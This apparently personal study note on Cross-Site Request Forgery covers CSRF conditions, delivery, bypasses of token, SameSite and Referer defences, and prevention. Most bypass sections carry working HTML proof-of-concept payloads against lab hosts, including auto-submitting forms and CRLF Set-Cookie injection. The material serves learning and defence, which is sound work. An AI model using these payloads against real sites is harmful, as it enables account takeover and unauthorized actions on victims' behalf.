**Token**  :
- no validation
- array (type error)
- static
- short

> check for change of referrer headers
> check for change method

https://dark-hawk-a84.notion.site/Cross-Site-Request-Forgery-CSRF-1713f9d3dc2e819fbaf7ebc7c3c3eefb
# Cross-Site Request Forgery [CSRF]

# Introduction To CSRF

Cross-Site Request Forgery (CSRF) is a security vulnerability where an attacker deceives a user's browser into executing unintended actions on a website where the user is logged in. This deception typically occurs when a user interacts with a malicious website or clicks on a carefully crafted link.

The crux of CSRF lies in exploiting the trust relationship between a website and the user's browser. Websites often use session cookies to identify and validate user actions after authentication. If an attacker manages to coerce the user's browser into sending a request to the targeted website where the user is authenticated, the website might mistakenly treat the request as genuine.

For instance, picture a scenario where a user is logged into their online banking account. If the attacker can manipulate the user into clicking a link or visiting a page containing a concealed form that initiates a money transfer, the user's browser will transmit the request to the bank alongside the user's authentication credentials, potentially enabling unauthorized transactions.

# How CSRF Works

For a CSRF attack to succeed, three essential conditions must be met:

- **Relevant Action:** The application must have an action that the attacker wants to trigger. This action could be something privileged, like altering permissions for other users, or any action related to user-specific data, such as modifying the user's password.
- **Cookie-based Session Handling:** The execution of the action involves sending one or more HTTP requests, and the application relies exclusively on session cookies to identify the user making those requests. There are no additional mechanisms in place for session tracking or user request validation.
- **Predictable Request Parameters:** The requests responsible for performing the action do not include any parameters whose values are unpredictable or beyond the attacker's ability to guess. For example, if a user is prompted to change their email address, the function is not vulnerable if the attacker needs to know the current email address to initiate the change.

The scenario involves a user changing their email address on a vulnerable website. When the user performs this action, an HTTP request like the following is sent:

```php
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com

```

Here's how the attack works:

1. The application employs a session cookie to identify the user issuing the request.
2. The attacker can easily discern the necessary parameter values required for the action.

Proof of Concept (PoC):

```html
<html>
	<body>
		<form action="<https://vulnerable-website.com/email/change>" method="POST">
			 <input type="hidden" name="email" value="pwned@evil-user.net" />
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>

```

When a victim user visits the attacker's webpage:

- The attacker's page initiates an HTTP request to the vulnerable website.
- If the user is logged in, their browser automatically includes their session cookie in the request (unless `SameSite cookies` are implemented).
- The vulnerable website processes the request as usual, treating it as if it were made by the victim user, and consequently alters their email address.

> It's worth noting that while CSRF is commonly associated with cookie-based session handling, it can also occur in other scenarios where user credentials are automatically appended to requests, such as HTTP Basic authentication or certificate-based authentication.

# CSRF vs XSS

CSRF (Cross-Site Request Forgery) and XSS (Cross-Site Scripting) are both security vulnerabilities that can affect web applications, but they target different aspects of web security.

1. **CSRF (Cross-Site Request Forgery):**
    - **Attack Type:** CSRF is an attack that tricks the victim into submitting a malicious request. It typically involves a third-party site making requests on behalf of the victim, often without the victim's knowledge.
    - **Objective:** The goal of a CSRF attack is to perform an action on a website where the victim is authenticated. For example, if the victim is logged into their online banking account, the attacker might trick the victim's browser into making a transfer or changing account settings.
    - **Mitigation:** To prevent CSRF attacks, web developers often use anti-CSRF tokens. These tokens are unique values associated with a user's session and are included in forms or requests. The server verifies the token to ensure the legitimacy of the request.
2. **XSS (Cross-Site Scripting):**
    - **Attack Type:** XSS involves injecting malicious scripts into web pages that are then executed by the victim's browser. This can occur when the application doesn't properly validate or sanitize user input and allows the injection of scripts.
    - **Objective:** The goal of an XSS attack is to execute malicious scripts in the context of a user's browser, often stealing sensitive information such as cookies or login credentials. XSS can be stored (persisted in a database and served to other users) or reflected (immediately executed).
    - **Mitigation:** To prevent XSS attacks, developers should validate and sanitize user input, use secure coding practices, and implement content security policies (CSP) to control what resources can be loaded by a page.

> In summary, CSRF involves making unauthorized requests on behalf of a user without their knowledge, while XSS involves injecting and executing malicious scripts within the user's browser. Mitigating these vulnerabilities requires different security measures, including the use of anti-CSRF tokens for CSRF and proper input validation and content security policies for XSS.

# How to deliver a CSRF exploit

The distribution of CSRF exploits involves tricking users into interacting with malicious payloads, which can be delivered through:

1. **Malicious Links:** Attackers send phishing emails or messages containing links to malicious sites.
2. **Malicious Forms or Scripts:** CSRF payloads are embedded in webpages, hidden within forms or scripts.
3. **Ads or Injected Content:** Malicious ads or content on compromised sites carry CSRF payloads.
4. **Social Engineering:** Users are enticed to click on seemingly harmless links via social media or forums.
5. **Watering Hole Attacks:** Attackers compromise frequented websites, inserting CSRF payloads into their content.

**How to Craft CSRF Payload**

- **Burp Pro CSRF Generator:** Utilizing the CSRF generator feature in Burp Pro for creating CSRF exploits.
- **Manual HTML Creation:** Crafting the necessary HTML code manually to execute a CSRF exploit.
- **Using This [Website](https://security.love/CSRF-PoC-Genorator/)**

# Bypassing Common defences against CSRF

Common defenses against CSRF attacks include:

- **CSRF Tokens:** These are unique tokens embedded in forms or requests, tied to the user's session. Servers validate these tokens to ensure request legitimacy, making it challenging for attackers to forge valid requests.
- **SameSite Cookies:** This browser security mechanism regulates when a website's cookies are sent in requests from other sites. By enforcing appropriate SameSite restrictions, such as the default `Lax` setting in Chrome since 2021, browsers can prevent cross-site triggering of sensitive actions requiring authenticated session cookies.
- **Referer-based Validation:** Some applications use the HTTP Referer header to verify if requests originate from their own domain, aiming to thwart CSRF attacks. However, this method is typically less effective than CSRF token validation.

## Bypassing CSRF token validation

**A CSRF token** is a distinct, confidential, and unpredictable value generated by the server-side application and communicated to the client. When initiating a request for a sensitive action, like form submission, the client must provide the accurate CSRF token. Failure to do so results in the server rejecting the requested action.

Although anti-CSRF tokens are potent in combating CSRF attacks, flaws in their implementation can leave loopholes for attackers to exploit. Common weaknesses in CSRF token validation comprise:

- CSRF token validation relies on the request method.
- CSRF token validation depends on the token's presence.
- CSRF token is not tied to the user session
- CSRF token linked to a non-session cookie.
- CSRF token is replicated within a cookie.

### CSRF token validation relies on the request method

Improper implementation of CSRF token validation, contingent on the request method, can introduce CSRF vulnerabilities. Manipulating the request method enables bypassing the validation process.

**POST Request**

![https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/1e830e43-f127-4f6c-978d-525c6a1169ff/Untitled.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/1e830e43-f127-4f6c-978d-525c6a1169ff/Untitled.png)

**GET Request Bypass The Validation**

![https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/5b975026-2d11-44ce-a723-e4e9cbec075f/Untitled.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/5b975026-2d11-44ce-a723-e4e9cbec075f/Untitled.png)

**Proof of Concept — POC**

```html
~~<~~html>
  <body>
    <form action="<https://0aa8000a034e81d681c2033e00ad001c.web-security-academy.net/my-account/change-email>">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

### CSRF token validation depends on the token's presence

If the validation of CSRF tokens relies solely on the token being present without proper verification, it can lead to CSRF vulnerabilities. Here's how:

1. **Token Presence Only:** ◦ If the server merely checks for the existence of a CSRF token without validating its authenticity, attackers can execute a CSRF attack by omitting the token or using an invalid one.
2. **Validation Bypass:** ◦ Attackers might try crafting requests without a valid CSRF token. In the absence of rigorous validation, the server could accept requests lacking the necessary token, enabling unauthorized actions on behalf of the victim.

**The server only validate the `CSRF Token` if it is contained in the request:**

![https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/abe8b851-ffbc-4ca2-8f4d-a13190b71caa/Untitled.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/abe8b851-ffbc-4ca2-8f4d-a13190b71caa/Untitled.png)

**When we remove it we bypass the validation:**

![https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/50cb4aa3-6dcf-4e97-ac96-675acfcd5a15/Untitled.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/50cb4aa3-6dcf-4e97-ac96-675acfcd5a15/Untitled.png)

**Proof of Concept — POC:**

```html
<html>
  <body>
    <form action="<https://0aa8000a034e81d681c2033e00ad001c.web-security-academy.net/my-account/change-email>" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

### CSRF token is not tied to the user session

In certain cases, applications fail to verify whether the CSRF token corresponds to the user's session initiating the request. Instead, they uphold a shared repository of issued tokens, accepting any token found within this repository.

- When the CSRF token lacks a direct association with a user's session, attackers could potentially reuse a token acquired from one user to act on behalf of another. This scenario can result in unauthorized activities being carried out across multiple user accounts.

**Request to Change Email Address for User1:**

![https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/88eeaf75-7ac2-4d4c-89eb-e37d9137c759/Untitled.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/88eeaf75-7ac2-4d4c-89eb-e37d9137c759/Untitled.png)

**Request to Change Email Address for User2:**

![https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/a8e91aac-77f2-4a1d-af05-950ad5d53255/Untitled.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/a8e91aac-77f2-4a1d-af05-950ad5d53255/Untitled.png)

Using the CSRF Token of User1 (`uqax4nV25Tssh8sNxkSdLgU3cCKHFvS8`), let's attempt to execute an email update request on behalf of User2. Since the token validation lacks specificity to user sessions, this action is expected to bypass token validation.

![https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/856c6dec-04ae-4e9d-ae8d-5488787fb083/Untitled.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/856c6dec-04ae-4e9d-ae8d-5488787fb083/Untitled.png)

**Proof of Concept — POC:**

```html
<html>
  <body>
    <form action="<https://0aa8000a034e81d681c2033e00ad001c.web-security-academy.net/my-account/change-email>" method="POST">
      <input type="hidden" name="email" value="test&#64;email&#46;com" />
      <input type="hidden" name="csrf" value="uqax4nV25Tssh8sNxkSdLgU3cCKHFvS8" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

### CSRF token linked to a non-session cookie

In a variant of the previous vulnerability, certain applications do link the CSRF token to a cookie, albeit not to the same cookie utilized for session tracking. This scenario often arises when an application employs two separate frameworks—one for managing sessions and another for CSRF protection—that are not seamlessly integrated.

```html
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com

```

Though more challenging to exploit, this scenario remains vulnerable. If the website permits attackers to set cookies in a victim's browser, exploitation is feasible. Attackers can log into the application with their account, acquire a valid token and associated cookie, utilize cookie-setting functionality to place their cookie in the victim's browser, and provide their token to the victim in a CSRF attack.

User1

![https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/24df0ae1-54f6-4f82-9b36-31056079ce0b/Untitled.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/24df0ae1-54f6-4f82-9b36-31056079ce0b/Untitled.png)

User2

![https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/bbf2cf9d-30b2-4ba5-9344-9d6567b6decf/Untitled.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/bbf2cf9d-30b2-4ba5-9344-9d6567b6decf/Untitled.png)

If attempting to substitute the CSRF token of User2 with that of User1, this approach will fail since the CSRF token is linked to the CSRF key cookie. Thus, to execute the task successfully, both the CSRF token and the CSRF key of User1 must be added to the request of User2.

![https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/1f407429-0952-4b90-a56b-a5613c36b11f/Untitled.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/1f407429-0952-4b90-a56b-a5613c36b11f/Untitled.png)

In our Proof of Concept (PoC), we must compel the victim's browser to alter the value of the `csrfkey` cookie when `user2` visits the website containing our PoC. This can be achieved through the `Set-Cookie` header, leveraging HTTP Header Injection.Hence, we must identify a location where we can inject HTTP headers.

Our website features a search function that stores the search value in a cookie.

![https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/3063671a-c0ef-45f7-a9a0-05b438656791/Untitled.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/3063671a-c0ef-45f7-a9a0-05b438656791/Untitled.png)

Therefore, we can execute HTTP Header Injection in the search function like this:

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=Y4qLpaS6xXTHtlGsd9f4f93mIUfmDh92%3b%20SameSite=None

# Decoded
/?search=test
Set-Cookie: csrfKey=Y4qLpaS6xXTHtlGsd9f4f93mIUfmDh92; SameSite=None

```

**Proof of Concept — POC:**

```html
<html>
  <body>
    <form action="<https://0a1b00ef041f51bf82e6e49b002f00f7.web-security-academy.net/my-account/change-email>" method="POST">
      <input type="hidden" name="email" value="user2&#64;email&#46;com" />
      <input type="hidden" name="csrf" value="9h5vwANK7MiQSftMonuRzW8FOC9JPzdt" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="<https://0a1b00ef041f51bf82e6e49b002f00f7.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=Y4qLpaS6xXTHtlGsd9f4f93mIUfmDh92%3b%20SameSite=None>" onerror="document.forms[0].submit()">
  </body>
</html>

```

### CSRF token is replicated within a cookie

If a CSRF token is merely duplicated in a cookie without additional safeguards, it can pave the way for potential CSRF exploits as it lacks protection against certain attack vectors.

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com

```

In this scenario, the attacker can conduct a CSRF attack without needing a valid token of their own. They fabricate a token, possibly matching the required format if checked, utilize cookie-setting functionality to insert their cookie into the victim's browser, and then supply their token to the victim in the CSRF attack.

This POST request reveals that the `CSRF Token` is replicated from the cookie.

![https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/9ad492da-9fe0-4e1e-afc8-f15ed70783ac/Untitled.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/9ad492da-9fe0-4e1e-afc8-f15ed70783ac/Untitled.png)

HTTP Header Injection can be exploited here to alter the `csrf` cookie, subsequently causing the `CSRF Token` to automatically adjust to match the cookie value.

```
/?search=test%0d%0aSet-Cookie:%20csrf=n1ghtm4r3%3b%20SameSite=None

```

**Proof of Concept — POC:**

```html
<html>
  <body>
    <form action="<https://0a1000ff0374d951822e5b7b00940015.web-security-academy.net/my-account/change-email>" method="POST">
      <input type="hidden" name="email" value="user1&#64;email&#46;com" />
      <input type="hidden" name="csrf" value="n1ghtm4r3" />
      <input type="submit" value="Submit request" />
    </form>
	<img src="<https://0a1000ff0374d951822e5b7b00940015.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=n1ghtm4r3%3b%20SameSite=None>" onerror="document.forms[0].submit();"/>
  </body>
</html>

```

## Bypassing SameSite cookie restrictions

The SameSite cookie attribute regulates the transmission of cookies with cross-origin requests. It aids in mitigating specific types of cross-site request forgery (CSRF) attacks by determining whether a cookie should be confined to the same site or permitted for cross-site requests.

**Ways to bypass SameSite cookie restrictions include:**

- Bypassing SameSite Lax Restrictions with GET Requests
- Bypassing SameSite Restrictions using On-site Gadgets
- Bypassing SameSite Restrictions via Vulnerable Sibling Domains
- Bypassing SameSite Lax Restrictions with Newly Issued Cookies

### What is a site in the context of SameSite cookies?

In the realm of SameSite cookie restrictions, a site encompasses the top-level domain (TLD) usually something like `.com` or `.net`, along with one additional level of the domain name, commonly denoted as the TLD+1.

When assessing the sameness of a request, the URL scheme is factored in. Consequently, a link from `http://app.example.com` to `https://app.example.com` is typically regarded as cross-site by the majority of browsers.

![https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/6d9889a2-db9c-4758-ba3c-fe6efc526676/Untitled.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/6d9889a2-db9c-4758-ba3c-fe6efc526676/Untitled.png)

> [🗒️ Note!] You may come across the term "effective top-level domain" (eTLD). This is just a way of accounting for the reserved multipart suffixes that are treated as top-level domains in practice, such as .co.uk.

### Site Vs origin

In web security:

- **Origin:** An origin comprises the protocol (e.g., HTTP or HTTPS), domain, and port of a web page, representing its base URL. For instance, the origin of `https://www.example.com:8080` includes the protocol (https), domain (`www.example.com`), and port (`8080`).
- **Site:** Often used interchangeably with a domain, "site" denotes the base location of a collection of web pages sharing the same domain. For instance, `www.example.com` and `blog.example.com` are distinct sites under the `example.com` domain. In the context of SameSite cookies, "site" typically refers to the domain of the website.

![https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/87df9b75-e40a-4628-8ce8-cb269af54cf6/Untitled.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/79b8e813-6109-41a1-851d-5f6aab6a082b/87df9b75-e40a-4628-8ce8-cb269af54cf6/Untitled.png)

|Request from|Request to|Same-site?|Same-origin?|
|---|---|---|---|
|`https://example.com`|`https://example.com`|Yes|Yes|
|`https://app.example.com`|`https://intranet.example.com`|Yes|No: mismatched domain name|
|`https://example.com`|`https://example.com:8080`|Yes|No: mismatched port|
|`https://example.com`|`https://example.co.uk`|No: mismatched eTLD|No: mismatched domain name|
|`https://example.com`|`http://example.com`|No: mismatched scheme|No: mismatched scheme|

### How does SameSite work?

SameSite operates by empowering browsers and website administrators to restrict the inclusion of specific cookies in cross-site requests, thereby mitigating users' vulnerability to CSRF attacks. In a CSRF attack, the victim's browser unwittingly executes a request that initiates a malicious action on the vulnerable website. As these requests typically necessitate a cookie linked to the victim's authenticated session, the attack is thwarted if the browser omits this cookie.

Currently, all major browsers offer support for the following SameSite restriction levels:

- `Strict`
- `Lax`
- `None`

Developers can manually specify a restriction level for each cookie they establish, granting them greater control over the circumstances in which these cookies are utilized. To accomplish this, they simply need to include the `SameSite` attribute in the `Set-Cookie` response header, along with their chosen value:

```
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict

```

**SameSite restriction levels:**

1. **Strict:**
    - Cookies with `SameSite=Strict` are exclusively sent in a first-party context, meaning they're transmitted only if the request originates from the same site as the domain in the cookie.
2. **Lax (default):**
    - Cookies with `SameSite=Lax` are sent with top-level navigations and first-party subresource requests, such as GET requests initiated by the user. However, they're not sent with cross-origin POST requests or third-party requests triggered by actions like loading an image.
    - Browsers send the cookie in cross-site requests only if the request is a GET method and resulted from a user's top-level navigation, such as clicking on a link.
3. **None:**
    - Cookies with `SameSite=None` are transmitted with all requests, including cross-origin requests. However, this level necessitates the Secure attribute, requiring the cookie to be sent exclusively over HTTPS.

Impact scenarios of SameSite cookie restrictions:

- **Scenario 1: Strict**
    - **Cookie Setting:** `SameSite=Strict`
    - **Effect:** Cookie is dispatched solely if the request originates from the same site.
- **Scenario 2: Lax**
    - **Cookie Setting:** `SameSite=Lax`
    - **Effect:** Cookie is sent with top-level navigations and first-party subresource requests, offering flexibility while guarding against CSRF.
- **Scenario 3: None (Secure)**
    - **Cookie Setting:** `SameSite=None; Secure`
    - **Effect:** Cookie is dispatched with all requests, including cross-origin ones, but solely over a secure HTTPS connection.

### Bypassing SameSite Lax restrictions using GET requests

If developers utilize `Lax` restrictions for their session cookies, whether explicitly or due to browser defaults, there's still potential for a CSRF attack by inducing a `GET` request from the victim's browser.

As long as the request entails a top-level navigation, the browser will continue to include the victim's session cookie. One of the simplest methods to execute such an attack is as follows:

```html
<script>
	document.location = '<https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000>';
</script>

```

If GET requests are prohibited, attackers may attempt to override the specified method in the request by utilizing the `_method` parameter in forms.

```html
<form action="<https://vulnerable-website.com/account/transfer-payment>" method="POST">
	<input type="hidden" name="_method" value="GET">
	<input type="hidden" name="recipient" value="hacker">
	<input type="hidden" name="amount" value="1000000">
</form>

```

The `_method` parameter is permitted in certain frameworks such as:

- Ruby on Rails
- Node.js
- Django

Other frameworks may support similar parameters with varying names and functionalities.

**Proof of Concept — POC:**

```html
<html>
  <body>
    <form action="<https://0af20012031728318040e418003f00c2.web-security-academy.net/my-account/change-email>" method="GET">
      <input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="pwn&#64;email&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

### Bypassing SameSite restrictions using on-site gadgets

When a cookie is configured with the `SameSite=Strict` attribute, browsers refrain from including it in any cross-site requests. However, this limitation can potentially be circumvented by identifying a gadget that triggers a secondary request within the same site.

A potential gadget involves a client-side redirect that dynamically assembles the redirection target using attacker-supplied input, such as URL parameters.

Here's the scenario:

1. A page allows users to comment on a post, leading to a request sent to a confirmation page at `/post/comment/confirmation?postId=x`. After a brief interval, users are redirected back to the blog post.
2. Examination of the request reveals that client-side redirection is managed through the JavaScript file `/resources/js/commentConfirmationRedirect.js`.
3. Analysis of the JavaScript code reveals that it utilizes the `postId` query parameter to dynamically construct the path for redirection.
4. Upon visiting the link `/post/comment/confirmation?postId=foo`, users initially see the post confirmation page before the client-side JavaScript redirects them to a path containing the injected string: `/post/foo`.
5. Path traversal injection is now possible, enabling redirection to the account page at `/post/comment/confirmation?postId=1/../../my-account`.
6. CSRF Exploitation:

```html
<script>
	document.location = "<https://example.com/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40hacker.com%26submit=1>";
</script>

```

In the CSRF exploit, we include the `submit` parameter and URL encode the ampersand delimiter to prevent breaking out of the `postId` parameter in the initial setup request.

> The PoC succeeds because client-side redirects are treated as standalone requests by browsers, not genuine redirects. As a same-site request, it includes all cookies related to the site, bypassing any restrictions in place.

### Bypassing SameSite restrictions via vulnerable sibling domains

Ensure a comprehensive audit of all available attack surfaces, including sibling domains. Vulnerabilities allowing the elicitation of arbitrary secondary requests, such as XSS, can completely compromise site-based defenses, exposing all of the site's domains to cross-site attacks.

### Bypassing SameSite Lax restrictions with newly issued cookies

Cookies with `Lax` SameSite restrictions typically aren't included in cross-site `POST` requests, with exceptions.

Chrome defaults to applying `Lax` restrictions, but it doesn't enforce them for the first 120 seconds on top-level `POST` requests to prevent disrupting single sign-on (SSO) mechanisms. This creates a two-minute vulnerability window during which users may be susceptible to cross-site attacks.

> This two-minute window does not apply to cookies that were explicitly set with the SameSite=Lax attribute.

It's challenging to time an attack within the short window of Chrome's relaxation of `Lax` SameSite restrictions on top-level `POST` requests. However, if you can find a gadget on the site to force the victim into receiving a new session cookie, you can preemptively refresh their cookie before executing the main attack. For instance, completing an OAuth-based login flow may generate a new session each time, as the OAuth service may not ascertain the user's login status on the target site.

To initiate the cookie refresh without the victim manually logging in again, a top-level navigation is required to ensure inclusion of cookies associated with their current OAuth session. However, redirecting the user back to your site after the navigation is necessary to execute the CSRF attack, adding an extra layer of complexity.

> You can trigger the cookie refresh from a new tab so the browser doesn't leave the page before you're able to deliver the final attack. window.open('[https://vulnerable-website.com/login/sso](https://vulnerable-website.com/login/sso)'); this popup will be blocked by the browser by default

To circumvent the popup block, you can encapsulate the statement within an `onclick` event handler, like this:

```
window.onclick = () => {
	window.open('<https://vulnerable-website.com/login/sso>'); \\\\\\\\
}
//This way, the `window.open()` method is only invoked when the user clicks somewhere on the page.

```

## Bypassing Referer-based CSRF defenses

Certain applications utilize the HTTP `Referer` header as a defense against CSRF attacks, usually by validating that the request originated from the application's domain. However, this method is generally less effective and prone to bypasses.

_Referrer header_: An HTTP header field that specifies the webpage's address linking to the requested resource. It's sent by the browser in an HTTP request.

### Validation of Referer depends on header being present

In scenarios where some applications validate the `Referer` header only when present in requests but skip validation if the header is absent, attackers can exploit this by crafting their CSRF exploit to manipulate the victim user's browser into omitting the `Referer` header in the resulting request.

```html
// META tag within the HTML page that hosts the CSRF attack
<meta name="referrer" content="never">

```

### Validation of Referer can be circumvented

Some applications employ naive validation of the `Referer` header, which can be circumvented. For instance, if the application checks that the domain in the `Referer` starts with the expected value, attackers can exploit this by placing it as a subdomain of their own domain:

```
<http://vulnerable-website.com.attacker-website.com/csrf-attack>

```

Similarly, if the application merely validates that the `Referer` contains its own domain name, attackers can manipulate the required value elsewhere in the URL to bypass this validation.

```
<http://attacker-website.com/csrf-attack?vulnerable-website.com>

```

Note: While you might detect this behavior using Burp, it may not work when testing your proof-of-concept in a browser. To mitigate the risk of leaking sensitive data, many browsers now strip the query string from the Referer header by default. You can override this behavior by ensuring that the response containing your exploit includes the `Referrer-Policy: unsafe-url` header.

# Preventing CSRF vulnerabilities

**Implement CSRF Tokens**

Employing CSRF tokens is a robust defense against CSRF attacks. These tokens should adhere to the following standards:

- Possess high entropy and unpredictability, similar to session tokens.
- Associated with the user's session.
- Thoroughly validated before executing any relevant action.

CSRF tokens should be treated as sensitive data and handled securely throughout their lifecycle. A common method involves embedding the token within a hidden field of an HTML form submitted via the POST method:

```html
<input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz" />

```

Upon token generation, it should be stored server-side within the user's session data. During subsequent requests requiring validation, the server-side application must verify that the request includes a token matching the stored session value. This validation should occur irrespective of the HTTP method or content type of the request.

**Enforce Strict SameSite Cookie Restrictions**

Implement your own SameSite restrictions for each cookie issued. This enables precise control over the contexts in which the cookie is utilized, regardless of browser behavior. Even though browsers may default to a "Lax-by-default" policy, it may not suit every cookie and can be more susceptible to bypass compared to `Strict` restrictions.

[^1]: 
